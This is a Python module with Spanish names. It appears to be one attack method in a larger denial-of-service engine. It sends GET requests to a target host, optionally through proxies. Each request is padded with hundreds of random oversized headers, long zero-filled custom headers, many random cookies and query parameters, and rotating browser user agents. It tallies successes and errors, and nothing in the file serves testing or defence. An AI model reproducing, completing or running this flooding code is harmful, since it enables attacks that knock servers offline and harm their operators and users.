import asyncio
import random
import os
import aiohttp
from aiohttp import ClientSession, ClientTimeout, ClientError

class CabecerasMultiples:
    def __init__(self, motor):
        self.motor = motor
        
    async def ejecutar(self, proxy=None):
        sesion = None
        try:
            sesion = await self.motor.pool.obtener_conexion(
                self.motor.host,
                self.motor.puerto,
                self.motor.ssl,
                proxy
            )
            
            if not sesion:
                return
                
            cabeceras = {
                "User-Agent": random.choice([
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15"
                ]),
                "Accept": "*/*",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive"
            }
            
            for i in range(random.randint(100, 500)):
                cabeceras[f"X-Header-{random.randint(1, 99999)}"] = os.urandom(random.randint(1, 1000)).hex()
                
            for i in range(random.randint(50, 200)):
                cabeceras[f"X-Custom-{i}"] = "0" * random.randint(100, 5000)
                
            cabeceras["Cookie"] = "; ".join([
                f"{os.urandom(10).hex()}={os.urandom(10).hex()}" 
                for _ in range(random.randint(50, 200))
            ])
            
            params = {f"_{i}": os.urandom(50).hex() for i in range(random.randint(50, 200))}
            
            url = f"{'https' if self.motor.ssl else 'http'}://{self.motor.host}:{self.motor.puerto}/"
            
            async with sesion.get(
                url,
                headers=cabeceras,
                params=params,
                timeout=ClientTimeout(total=self.motor.timeout)
            ) as respuesta:
                await respuesta.read()
                self.motor.estadisticas.agregar_exito(len(cabeceras) + len(params))
                
        except (asyncio.CancelledError, ClientError, Exception):
            self.motor.estadisticas.agregar_error()
        finally:
            if sesion:
                await self.motor.pool.liberar_conexion(sesion)